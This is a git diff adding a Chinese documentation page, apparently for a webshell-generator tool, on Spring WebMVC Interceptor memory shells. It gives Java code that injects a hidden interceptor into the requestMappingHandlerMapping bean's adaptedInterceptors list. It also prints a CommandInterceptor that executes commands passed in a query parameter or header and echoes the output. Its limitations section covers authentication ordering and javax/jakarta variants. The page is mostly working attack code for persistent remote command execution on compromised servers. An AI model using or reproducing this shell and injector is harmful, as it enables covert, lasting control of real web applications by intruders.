@@ -1,5 +1,96 @@
 ---
 title: WebMVC Interceptor
+description: 拦截器，命中 webshell 逻辑中断请求
 ---
 
-WIP
+> [官方文档 - Spring Web MVC - Interceptors](https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-config/interceptors.html)
+
+Interceptor 是 Spring WebMVC 在 Handler 执行前后插入逻辑的组件。`DispatcherServlet.doDispatch` 拿到 `HandlerExecutionChain` 后，会先按顺序执行所有拦截器的 `preHandle`：
+
+```java
+mappedHandler = getHandler(processedRequest);
+HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());
+
+if (!mappedHandler.applyPreHandle(processedRequest, response)) {
+    return;
+}
+
+mv = ha.handle(processedRequest, response, mappedHandler.getHandler());
+mappedHandler.applyPostHandle(processedRequest, response, mv);
+```
+
+`applyPreHandle` 返回 false 时请求直接结束，后面的 Handler 与拦截器都不会执行，响应由当前拦截器负责；请求完成后还会回调 `afterCompletion`。这个中断能力正是 Interceptor 内存马需要的：命中参数时写响应并返回 false，未命中时返回 true 放行。
+
+## adaptedInterceptors
+
+`RequestMappingHandlerMapping` 继承 `AbstractHandlerMapping`。应用启动时 `initInterceptors` 把 `WebMvcConfigurer.addInterceptors` 注册的拦截器整理进 `adaptedInterceptors`，每次 `getHandler` 都会把它复制到新的 `HandlerExecutionChain.interceptorList`。
+
+注入器不经过 Spring 的注册 API，直接拿到 `requestMappingHandlerMapping` bean，把 shell 追加到 `adaptedInterceptors` 末尾：
+
+```java
+Object mapping = invokeMethod(context, "getBean",
+        new Class[]{String.class}, new Object[]{"requestMappingHandlerMapping"});
+List<Object> adaptedInterceptors =
+        (List<Object>) getFieldValue(mapping, "adaptedInterceptors");
+for (Object adaptedInterceptor : adaptedInterceptors) {
+    if (adaptedInterceptor.getClass().getName().equals(getClassName())) {
+        return;
+    }
+}
+adaptedInterceptors.add(shell);
+```
+
+WebApplicationContext 来自当前请求：
+
+```java
+Object requestAttributes = invokeMethod(
+        classLoader.loadClass("org.springframework.web.context.request.RequestContextHolder"),
+        "getRequestAttributes");
+Object request = invokeMethod(requestAttributes, "getRequest");
+Object context = invokeMethod(request, "getAttribute",
+        new Class[]{String.class},
+        new Object[]{"org.springframework.web.servlet.DispatcherServlet.CONTEXT"});
+```
+
+注入器本身运行在漏洞入口的请求线程里，`RequestContextHolder` 可以直接拿到当前请求。若注入发生在非请求线程，则回退到 `LiveBeansView.applicationContexts`；这个集合只有在应用启用 LiveBeansView（`spring.liveBeansView.mbeanDomain`）时才有内容，否则会报告 `context not found`。
+
+## InterceptorShell
+
+Interceptor 只需要实现 `preHandle`。下面的命令回显 shell 先读 query 参数，再读同名请求头：
+
+```java
+public class CommandInterceptor implements AsyncHandlerInterceptor {
+    public static String paramName;
+
+    @Override
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+        String p = request.getParameter(paramName);
+        if (p == null || p.isEmpty()) {
+            p = request.getHeader(paramName);
+        }
+        if (p != null) {
+            InputStream inputStream = getInputStream(getParam(p));
+            response.getWriter().write(new Scanner(inputStream).useDelimiter("\\A").next());
+            response.getWriter().flush();
+            return false;
+        }
+        return true;
+    }
+
+    // postHandle / afterCompletion / afterConcurrentHandlingStarted 空实现
+}
+```
+
+1. `AsyncHandlerInterceptor` 比 `HandlerInterceptor` 多一个异步请求用的 `afterConcurrentHandlingStarted`；同步请求只走 `preHandle`、`postHandle`、`afterCompletion`。
+2. `paramName` 由生成器写入。`request.getParameter` 同时覆盖 GET query 与 `application/x-www-form-urlencoded` 的 POST body，`multipart/form-data` 取不到。
+3. 命中后写响应并返回 false，请求在 `DispatcherServlet` 内终止；未命中必须返回 true，否则业务请求会全部断掉。
+
+## 限制
+
+**没有 URL Pattern。** 注入的拦截器没有路径映射，壳会收到 `RequestMappingHandlerMapping` 能匹配到的所有请求。静态资源（`ResourceHttpRequestHandler`）和其他 HandlerMapping 处理的请求不会触发。
+
+**排在业务拦截器之后。** 注入器只做 `add`，shell 在 `adaptedInterceptors` 末尾。`WebMvcConfigurer` 注册的鉴权拦截器先执行，被拒绝的请求到不了 shell；如果鉴权在 Servlet Filter（Spring Security、Shiro）里，整个 DispatcherServlet 都在它后面，Interceptor 马绕不过去。
+
+**依赖 bean 名。** 注入器按 `requestMappingHandlerMapping` 这个默认 bean 名取 HandlerMapping。应用自行注册或重命名该 bean 时注入会失败。
+
+**javax / jakarta 两种挂载类型。** Spring WebMVC 3.x ~ 5.x、Spring Boot 1.x / 2.x 选择 `Interceptor`；Spring WebMVC 6.x、Spring Boot 3.x / 4.x 选择 `JakartaInterceptor`。两者使用同一份注入器，shell 源码按 `javax.servlet` 编写，生成时由 `JakartaPostProcessor` 统一重写到 `jakarta.servlet`。
